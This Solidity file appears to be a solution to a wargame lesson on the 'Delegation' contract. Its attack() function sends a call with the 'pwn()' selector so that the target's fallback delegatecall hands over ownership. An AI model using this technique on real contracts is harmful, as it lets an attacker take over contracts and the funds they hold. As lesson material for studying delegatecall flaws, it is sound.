// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../lessons/06-Delegation.sol";

contract DelegationAttack {
    Delegation delegation;

    constructor(address _delegationAddress) public {
        delegation = Delegation(_delegationAddress);
    }

    function attack() public {
        (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "attack contract revert");
    }
}
